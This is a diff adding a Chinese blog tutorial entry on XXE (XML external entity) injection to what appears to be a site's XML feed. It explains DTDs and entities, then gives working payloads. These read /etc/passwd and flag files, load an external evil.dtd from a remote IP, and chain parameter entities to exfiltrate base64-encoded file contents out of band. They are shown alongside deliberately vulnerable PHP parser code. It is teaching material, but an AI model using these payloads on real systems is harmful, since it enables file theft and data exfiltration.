@@ -3,6 +3,111 @@
   
     
     <entry>
+      <title><![CDATA[xxe简单漏洞]]></title>
+      <url>/2020/02/09/xxe%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E/</url>
+      <content type="html"><![CDATA[<h2 id="xml的基础知识"><a href="#xml的基础知识" class="headerlink" title="xml的基础知识"></a>xml的基础知识</h2><p>在了解xxe漏洞之前，需要明白一定的基础知识，那就是xml。</p>
+<p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
+<h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DTD：</span><br><span class="line"></span><br><span class="line">	&lt;?xml version=<span class="string">"1.0"</span>?&gt; 			 (这一行是XML文档定义)</span><br><span class="line">	&lt;!DOCTYPE note [				（定义此文档是note类型的文档）</span><br><span class="line">	&lt;!ELEMENT note (to ,from ,head ,body)&gt;	（定义note元素有四个元素）</span><br><span class="line">	&lt;!ELEMENT to (<span class="comment">#PCDATA)&gt;			（定义to元素为“#PCDATA”类型）</span></span><br><span class="line">	&lt;!ELEMENT from (<span class="comment">#PCDATA)&gt;		（定义from元素为“#PCDATA”类型）</span></span><br><span class="line">	&lt;!ELEMENT head (<span class="comment">#PCDATA)&gt;		（定义head元素为“#PCDATA”类型）</span></span><br><span class="line">	&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt;		（定义body元素为“#PCDATA”类型）</span></span><br><span class="line"></span><br><span class="line">这个DTD定义了XML的跟元素为note，然后根元素下面有一些子元素，那么XML到时候必须要像下面所示这么写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XML：</span><br><span class="line">	&lt;note&gt;</span><br><span class="line">	&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">	&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">	&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p>
+<p>内部声明DTD：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>引用外部DTD：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM <span class="string">"文件名"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>DTD文档中有很多重要的关键字如下：</p>
+<p><strong>DOCTYPE（DTD的声明）</strong><br><strong>ENTITY（实体的声明）</strong><br><strong>SYSTEM、PUBLIC（外部资源申请）</strong></p>
+<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体可以简单的理解为变量，它必须在文档类型定义（DTD）中定义声明，可以在文档中的其他位置引用该变量的值</p>
+<p>实体可按类型主要分为以下四种：<br><strong>内置实体 (Built-in entities)</strong><br><strong>字符实体 (Character entities)</strong><br><strong>通用实体 (General entities)</strong><br><strong>参数实体 (Parameter entities)</strong></p>
+<p>从另一个角度来看，实体还可分为一般实体与参数实体：</p>
+<p><strong>一般实体只能在文档类型定义（DTD）中声明，在xml文档中引用；一般实体的声明语法为: <!ENTITY 实体名 "实体内容">，引用一般实体的方式为: &amp;实体名</strong></p>
+<p><strong>参数实体只能在文档类型定义（DTD）中引用和声明；参数实体的声明语法: &lt;!ENTITY %实体名 “实体内容”，引用参数实体的方式为: %实体名</strong></p>
+<p>实体根据引用方式，还可分为内部实体与外部实体</p>
+<p>内部实体：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 <span class="string">"实体的值"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>外部实体：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数实体：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 <span class="string">"实体的值"</span>&gt;</span><br><span class="line">or</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>一般实体 + 内部实体：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name <span class="string">"nMask"</span>&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数实体 + 外部实体：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>其中%name（参数实体）是在DTD中被引用的，而&amp;name（一般实体）是在xml文档中被引用的</p>
+<p>而xxe漏洞主要就是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体</p>
+<h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>若外部实体能在DTD中使用，那么URI中能写哪些类型的外部实体呢</p>
+<p>主要的有file、http、https、ftp等等，不同的程序支持的协议当然不一样</p>
+<img src="/2020/02/09/xxe简单漏洞/4.png">
+
+<p>其中php支持的协议会更多一些，但需要一定的扩展支持</p>
+<h2 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h2><p>XXE漏洞全称为XML External Entity Injection 即 xml 外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等。</p>
+<p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有上传文件进行过滤，导致可上传恶意xml文件。</p>
+<h3 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h3><p>第一步检测XML是否会被成功解析：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY name "my name is nMask"&gt;]&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
+<img src="/2020/02/09/xxe简单漏洞/5.png">
+
+<p>第二部检测服务器是否支持DTD引用外部实体：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % name SYSTEM "http://localhost/index.html"&gt;  </span></span><br><span class="line"><span class="meta">%name;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求</p>
+<img src="/2020/02/09/xxe简单漏洞/6.png">
+
+<p>若支持引用外部实体，那么很有可能是存在xxe漏洞的</p>
+<h2 id="xxe漏洞利用"><a href="#xxe漏洞利用" class="headerlink" title="xxe漏洞利用"></a>xxe漏洞利用</h2><h3 id="有回显任意文件读取"><a href="#有回显任意文件读取" class="headerlink" title="有回显任意文件读取"></a>有回显任意文件读取</h3><p>test.php：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom -&gt; loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$data = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $data;<span class="comment">//去掉即为无回显</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "file:///var/www/html/xxe/flag.txt"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2020/02/09/xxe简单漏洞/7.png">
+
+<p>但如果读取的文件中含有特殊符号（如 “ &lt; &gt; &amp; “等），那么就会报错或如图</p>
+<img src="/2020/02/09/xxe简单漏洞/9.png" class="8.png} 这时就需要认识另一样东西了 “CDATA” {%asset_img">
+
+<p>所以，我们可以将读取的文件定义为 “CDATA”，CDATA部分中的所有内容就会被解析器忽略，这样就可以读取文件了</p>
+<p>将payload2.0修改为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY start <span class="string">"&lt;![CDATA[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % goodies SYSTEM 'file:///var/www/html/xxe/flag.txt'&gt;]]&gt;</span></span><br><span class="line"><span class="string">"</span>&gt;]</span><br><span class="line">% goodies;</span><br><span class="line">&gt;</span><br><span class="line">&lt;data&gt;&amp;start&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>payload看起来好像没问题，但结果还是一样读取不出</p>
+<p>xml 解析器有个限制就是不能在内部ENTITY中引用，“PEReferences forbidden in internal subset in Entity ”指的就是禁止内部参数实体引用。</p>
+<p>那么我们就把内部换到外部来试试看</p>
+<p>payload3.0：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % start <span class="string">"&lt;![CDATA["</span>&gt;</span><br><span class="line">&lt;!ENTITY % goodies SYSTEM <span class="string">"file:///var/www/html/xxe/test.php"</span>&gt;</span><br><span class="line">&lt;!ENTITY % end <span class="string">"]]&gt;"</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://47.107.134.244:8080/xxe/evil.dtd"</span>&gt;</span><br><span class="line">%dtd; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;all;&lt;/data&gt;</span><br></pre></td></tr></table></figure>
+
+<p>evil.dtd:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY all <span class="string">"%start;%goodies;%end;"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>即可</p>
+<h3 id="无回显任意文件读取"><a href="#无回显任意文件读取" class="headerlink" title="无回显任意文件读取"></a>无回显任意文件读取</h3><p>既然没有回显数据，那我们就要想办法让服务器自己把数据往外带。</p>
+<p>写两个外部参数实体，第一个用来请求本地数据内容，第二个用 http 协议或者其他协议把请求到的数据作为参数带到我们的 vps，这样就实现了数据外带了</p>
+<p>test2.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>test.dtd</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///var/www/html/xxe/flag.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/xxe/index.php?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>send前面的 &amp;#37 会在HTML实体转化成 %</p>
+<p>payload:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://127.0.0.1/xxe/evil.dtd"</span>&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="/2020/02/09/xxe简单漏洞/10.png">
+
+<p>在 payload 中可看到连续调用了三个参数实体 %remote;%int;%send;，这就是利用顺序，先调用%remote，调用后会请求远程服务器上的evil.dtd，类似与将evil.dtd包含进来，然后 %int 调用 evil.dtd 中的 %file，%file 就会去获取服务器上的指定文件，然后将 %file 的结果输入到 %send 中（因为实体的值中不能有 % ，所以将其转成html实体编码 <strong>&#37;</strong> ），最后再调用 %send; 把我们读取到的数据发送到指定地址，利用log获取数据，从而实现外带数据的效果，解决XXE无回显的问题</p>
+]]></content>
+      
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[php反序列化漏洞——Session]]></title>
       <url>/2020/01/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94Session/</url>
       <content type="html"><![CDATA[<p>php存储session有三种模式，php_serialize, php, binary</p>
